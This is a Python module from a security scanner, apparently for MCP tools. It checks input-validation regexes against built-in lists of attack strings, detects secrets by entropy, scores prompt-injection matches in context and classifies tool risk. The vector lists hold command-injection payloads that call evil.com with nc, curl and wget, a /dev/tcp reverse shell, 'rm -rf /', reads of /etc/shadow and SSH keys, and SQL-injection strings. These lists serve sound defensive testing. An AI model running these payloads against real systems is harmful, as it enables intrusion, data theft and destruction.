"""Semantic heuristics for security analysis.

Pure-Python functions that go beyond regex pattern matching to provide
deeper, context-aware security analysis.  Used by static checks to:

- Evaluate whether JSON Schema ``pattern`` constraints actually block attacks
- Detect secrets via Shannon entropy + key-name heuristics
- Score prompt-injection matches in context to reduce false positives
- Classify tool risk from name + description semantics
"""

from __future__ import annotations

import math
import re
from collections import Counter
from enum import StrEnum

# ── Pattern Strength ──────────────────────────────────────────────────


class PatternStrength(StrEnum):
    """How effectively a regex pattern blocks known attack vectors."""

    NONE = "none"  # No pattern / invalid regex
    WEAK = "weak"  # Blocks < 50% of vectors
    MODERATE = "moderate"  # Blocks 50-89%
    STRONG = "strong"  # Blocks >= 90%


# Pre-built attack vector lists — used by input-validation checks.

COMMAND_INJECTION_VECTORS: list[str] = [
    "ls; cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "| nc evil.com 4444",
    "&& curl http://evil.com",
    "ls -la; rm -rf /",
    "; wget http://evil.com/shell.sh",
    "echo test > /tmp/pwned",
    "cat /etc/shadow",
    "bash -c 'id'",
    "sh -i >& /dev/tcp/evil/4444 0>&1",
    "ping -c 1 evil.com",
    "$(curl http://evil.com)",
    "test || cat /etc/passwd",
    "a`sleep 5`b",
    "cmd /c dir",
    "powershell -Command Get-Process",
    "$IFS",
    "test\nid",
    "; echo vulnerable",
]

PATH_TRAVERSAL_VECTORS: list[str] = [
    "../etc/passwd",
    "../../etc/shadow",
    "..\\windows\\system32\\config\\sam",
    "....//etc/passwd",
    "../../../etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "..%2fetc%2fpasswd",
    "..\\/etc/passwd",
    "/etc/passwd",
    "..%252fetc%252fpasswd",
    "....\\\\etc\\\\passwd",
    "..;/etc/passwd",
    "../.ssh/id_rsa",
    "../../.env",
    "..\\..\\..\\windows\\win.ini",
]

SQL_INJECTION_VECTORS: list[str] = [
    "' OR 1=1 --",
    "1; DROP TABLE users",
    "UNION SELECT * FROM users",
    "1' AND '1'='1",
    "admin'--",
    "' UNION SELECT null,null,null--",
    "1 OR 1=1",
    "'; EXEC xp_cmdshell('whoami')--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' OR ''='",
    "1 UNION ALL SELECT username,password FROM users--",
    "' AND 1=CONVERT(int, @@version)--",
    "1; SELECT pg_sleep(5)--",
    "' OR EXISTS(SELECT * FROM users)--",
    "1'; INSERT INTO log VALUES('pwned')--",
]


def assess_pattern_strength(
    pattern: str | None,
    attack_vectors: list[str],
) -> PatternStrength:
    """Test a JSON Schema ``pattern`` regex against known attack payloads.

    Returns how effectively the pattern blocks the provided vectors.
    A pattern is considered to *block* a vector when ``re.fullmatch``
    returns ``None`` (the vector does not match the pattern).

    Parameters
    ----------
    pattern:
        The regex pattern string from a JSON Schema ``pattern`` field.
        ``None`` or empty string returns :attr:`PatternStrength.NONE`.
    attack_vectors:
        List of known-malicious payloads to test against.

    Returns
    -------
    PatternStrength
        Strength tier based on the percentage of vectors blocked.
    """
    if not pattern:
        return PatternStrength.NONE

    try:
        compiled = re.compile(pattern)
    except re.error:
        return PatternStrength.NONE

    if not attack_vectors:
        return PatternStrength.STRONG

    blocked = 0
    for vector in attack_vectors:
        try:
            if compiled.fullmatch(vector) is None:
                blocked += 1
        except (re.error, RecursionError):
            blocked += 1  # Treat errors as "blocked"

    pct = blocked / len(attack_vectors)

    if pct >= 0.9:
        return PatternStrength.STRONG
    if pct >= 0.5:
        return PatternStrength.MODERATE
    return PatternStrength.WEAK


def pattern_block_percentage(
    pattern: str | None,
    attack_vectors: list[str],
) -> int:
    """Return the percentage (0-100) of attack vectors blocked by *pattern*.

    Convenience wrapper used in finding evidence strings.
    """
    if not pattern or not attack_vectors:
        return 0

    try:
        compiled = re.compile(pattern)
    except re.error:
        return 0

    blocked = sum(1 for v in attack_vectors if compiled.fullmatch(v) is None)
    return round(100 * blocked / len(attack_vectors))


# ── Entropy-Based Secret Detection ────────────────────────────────────


def compute_entropy(value: str) -> float:
    """Compute Shannon entropy of *value* in bits per character.

    Typical ranges:
    - English text: ~3.5
    - Random hex: ~4.0
    - Random base64: ~5.0-6.0
    - Repeated chars: ~0.0
    """
    if not value:
        return 0.0

    length = len(value)
    counts = Counter(value)
    return -sum((count / length) * math.log2(count / length) for count in counts.values())


# Words in key names that suggest the value might be a secret.
_SECRET_KEY_INDICATORS: set[str] = {
    "secret",
    "password",
    "passwd",
    "token",
    "key",
    "credential",
    "auth",
    "private",
    "signing",
    "encryption",
    "api_key",
    "apikey",
    "access_key",
}

# Patterns that indicate placeholder / test values (not real secrets).
_PLACEHOLDER_PATTERNS: list[re.Pattern[str]] = [
    re.compile(r"^test[_-]", re.IGNORECASE),
    re.compile(r"^fake[_-]", re.IGNORECASE),
    re.compile(r"^example", re.IGNORECASE),
    re.compile(r"^placeholder", re.IGNORECASE),
    re.compile(r"^changeme$", re.IGNORECASE),
    re.compile(r"^xxx+$", re.IGNORECASE),
    re.compile(r"^your[_-]", re.IGNORECASE),
    re.compile(r"^replace[_-]?me", re.IGNORECASE),
    re.compile(r"^todo", re.IGNORECASE),
    re.compile(r"^REDACTED$", re.IGNORECASE),
    re.compile(r"\*{3,}"),  # Masked values: "****"
    re.compile(r"^\$\{.+\}$"),  # Environment variable references: ${VAR}
]


def is_likely_secret(
    key_name: str,
    value: str,
) -> tuple[bool, float]:
    """Determine if a config/env value is likely a real secret.

    Combines Shannon entropy with key-name heuristics.

    Returns
    -------
    tuple[bool, float]
        ``(is_secret, confidence)`` where confidence is 0.0-1.0.
    """
    if not value or len(value) < 8:
        return False, 0.0

    # Check for placeholder patterns
    for pat in _PLACEHOLDER_PATTERNS:
        if pat.search(value):
            return False, 0.0

    entropy = compute_entropy(value)
    key_lower = key_name.lower()

    # Determine if the key name suggests a secret
    key_is_secret_like = any(indicator in key_lower for indicator in _SECRET_KEY_INDICATORS)

    # Thresholds depend on key name context
    if key_is_secret_like:
        # Lower bar for secret-named keys
        entropy_threshold = 3.0
        base_confidence = 0.6
    else:
        # Higher bar for generic key names
        entropy_threshold = 4.5
        base_confidence = 0.3

    if entropy < entropy_threshold:
        return False, 0.0

    # Scale confidence by how far above threshold
    overshoot = min(entropy - entropy_threshold, 2.0) / 2.0  # 0.0-1.0
    confidence = min(base_confidence + overshoot * 0.4, 1.0)

    # Boost for long values (more likely to be real secrets)
    if len(value) >= 32:
        confidence = min(confidence + 0.1, 1.0)

    return True, round(confidence, 2)


# ── Context-Aware Injection Scoring ───────────────────────────────────

# Words that, when found near a match, suggest the match is describing
# or warning about injection rather than performing it.
_NEGATION_CONTEXT_WORDS: set[str] = {
    "prevent",
    "block",
    "detect",
    "avoid",
    "protect",
    "guard",
    "filter",
    "sanitize",
    "escape",
    "reject",
    "mitigate",
    "defense",
    "security",
    "safe",
    "validate",
}

_DOCUMENTATION_MARKERS: set[str] = {
    "example:",
    "e.g.",
    "for instance",
    "such as",
    "documentation",
    "note:",
    "warning:",
    "caution:",
    "see also",
    "reference:",
}


def score_injection_context(
    text: str,
    match_start: int,
    match_end: int,
) -> float:
    """Score a prompt-injection match in context.

    Examines the surrounding text to determine whether the match is a
    genuine injection attempt (high score) or a false positive from
    documentation / security descriptions (low score).

    Returns
    -------
    float
        Score from 0.0 (likely false positive) to 1.5 (very suspicious).
        Matches below 0.5 should be considered false positives.
    """
    score = 1.0
    text_lower = text.lower()

    # Look at a context window before the match
    window_start = max(0, match_start - 60)
    preceding = text_lower[window_start:match_start]

    # Check for negation / protective context
    if any(word in preceding for word in _NEGATION_CONTEXT_WORDS):
        score *= 0.3

    # Check for documentation context anywhere in the text
    if any(marker in text_lower for marker in _DOCUMENTATION_MARKERS):
        score *= 0.4

    # Check for imperative context: match at sentence start is more suspicious
    if match_start == 0:
        score *= 1.3
    else:
        # Check if preceded by sentence boundary
        before_char = text[match_start - 1] if match_start > 0 else ""
        if before_char in {".", "!", "\n", ":"}:
            score *= 1.3

    # If the match is wrapped in quotes, it's likely an example
    if match_start > 0 and match_end < len(text):
        before = text[match_start - 1] if match_start > 0 else ""
        after = text[match_end] if match_end < len(text) else ""
        if before in {'"', "'", "\u201c"} and after in {'"', "'", "\u201d"}:
            score *= 0.3

    return round(score, 2)


# ── Tool Risk Classification ──────────────────────────────────────────


class ToolRisk(StrEnum):
    """Semantic risk classification for an MCP tool."""

    DESTRUCTIVE = "destructive"
    EXFILTRATIVE = "exfiltrative"
    PRIVILEGED = "privileged"
    READ_ONLY = "read_only"
    UNKNOWN = "unknown"


# Keywords mapped to risk categories.  Name matches are weighted 2x vs
# description-only matches to reflect the stronger signal.

_RISK_KEYWORDS: dict[ToolRisk, set[str]] = {
    ToolRisk.DESTRUCTIVE: {
        "delete",
        "remove",
        "drop",
        "truncate",
        "destroy",
        "wipe",
        "purge",
        "erase",
        "kill",
        "terminate",
        "uninstall",
        "revoke",
        "reset",
        "overwrite",
        "format",
    },
    ToolRisk.EXFILTRATIVE: {
        "send",
        "upload",
        "transmit",
        "forward",
        "post",
        "webhook",
        "email",
        "notify",
        "push",
        "export",
        "broadcast",
        "dispatch",
        "relay",
    },
    ToolRisk.PRIVILEGED: {
        "admin",
        "root",
        "sudo",
        "system",
        "execute",
        "shell",
        "exec",
        "command",
        "run",
        "spawn",
        "invoke",
        "privilege",
        "escalate",
        "chmod",
        "chown",
    },
    ToolRisk.READ_ONLY: {
        "get",
        "read",
        "list",
        "fetch",
        "query",
        "search",
        "view",
        "show",
        "describe",
        "inspect",
        "lookup",
        "find",
        "browse",
        "retrieve",
        "check",
    },
}


def classify_tool_risk(tool: dict) -> ToolRisk:
    """Classify a tool's risk level from its name and description.

    Uses weighted keyword matching: name matches count 2×, description
    matches count 1×.  The category with the highest score wins.
    Ties go to the more dangerous category.

    Parameters
    ----------
    tool:
        A tool dict with at least ``name`` and optionally ``description``.

    Returns
    -------
    ToolRisk
        The classified risk category.
    """
    name = tool.get("name", "").lower().replace("-", "_")
    description = tool.get("description", "").lower()

    # Tokenize name by underscores and description by whitespace
    name_tokens = set(name.split("_"))
    desc_tokens = set(description.split())

    # Priority order (most dangerous first) for tie-breaking
    priority = [
        ToolRisk.DESTRUCTIVE,
        ToolRisk.PRIVILEGED,
        ToolRisk.EXFILTRATIVE,
        ToolRisk.READ_ONLY,
    ]

    scores: dict[ToolRisk, float] = {}
    for risk, keywords in _RISK_KEYWORDS.items():
        name_hits = len(name_tokens & keywords)
        desc_hits = len(desc_tokens & keywords)
        scores[risk] = name_hits * 2.0 + desc_hits * 1.0

    # Pick the category with the highest score
    best_score = max(scores.values())
    if best_score == 0:
        return ToolRisk.UNKNOWN

    # Resolve ties by priority
    for risk in priority:
        if scores.get(risk, 0) == best_score:
            return risk

    return ToolRisk.UNKNOWN
